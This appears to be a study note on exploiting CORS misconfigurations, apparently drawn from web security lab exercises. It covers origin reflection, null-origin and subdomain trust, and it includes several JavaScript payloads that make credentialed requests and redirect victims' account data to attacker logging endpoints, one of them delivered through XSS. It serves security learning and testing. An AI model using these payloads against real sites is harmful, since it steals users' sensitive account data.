# Cross Origin Resource Sharing (CORS)

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). - Same-origin policy --restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. - A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS). - Various headers used in the response (origin, credentials, headers, methods) - From a security perspective, the use of the wildcard is restricted in the specification as you cannot combine the wildcard with the cross-origin transfer of credentials (authentication, cookies or client-side certificates). - Pre-Flight Checks - cross-origin request is preceded by a request using the OPTIONS method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request.

*   CORS vulnerability with basic origin reflection (Server-generated ACAO header from client-specified Origin header)

    * script to be used :
    * \
      &#x20; 			var req = new XMLHttpRequest();\
      &#x20; 			req.onload = reqListener;\
      &#x20; 			req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\
      &#x20; 			req.withCredentials = true;\
      &#x20; 			req.send();\
      &#x20; 		function reqListener() {      \
      &#x20; 			location='/log?key='+this.responseText;

    }; - Test whether the Origin header reflects arbitrary value sent by user and is reflected in the response header Allow-Origin along with Allow-Credentials.
* CORS vulnerability with trusted null origin
  * Errors parsing Origin headers
    * Application might whitelist a set of domains and sub-domain(include inexistent as well) to compare (prefix/suffix comparison) with the Client specified Origin Header.(normalwebsite.com)
    * Can be bypassed by using (hackernormalwebsite.com, normalwebsite.evil.com)
  *   Whitelisted null origin value

      * Origin header supports the value null. Browsers might send null in Origin header in various situations: Cross-origin redirects. Requests from serialized data. Request using the file: protocol. Sandboxed cross-origin requests.
      * Application might whitelist 'null' to support local development
      * Bypassed using a iframe sandboxed cross-origin request
      *

      var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send();

      function reqListener() { location='https://malicious-website.com/log?key='+encodeURIComponent(this.responseText); }; ">
* CORS vulnerability with trusted insecure protocols
  * Exploiting XSS via CORS trust relationships
    * If a application trusts any of its sub-domain that is vulnerable to XSS we can exploit CORS to get sensitive data from the application since the sub-domain is trusted(whitelisted).
  * Breaking TLS with poorly configured CORS
    * An application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP.
    * Steps The victim user makes any plain HTTP request. The attacker injects a redirection to: http://trusted-subdomain.vulnerable-website.com The victim's browser follows the redirect. The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: https://vulnerable-website.com The victim's browser makes the CORS request, including the origin: http://trusted-subdomain.vulnerable-website.com The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
  * If an application trusts a vulnerable subdomain (XSS) we can exploit the CORS vuln in the actual application leveraging XSS vulnerability present in the trusted subdomain or url. (Test for HTTP and HTTPS protocols)
  * \
    &#x20; 	document.location="http://trusted-vulnerable-website.com/?productId=4\<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://cors-misconfigured-website.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://collaborator -server.com/log?key='%2bthis.responseText; };%3c/script>\&storeId=1"
* CORS vulnerability with internal network pivot attack
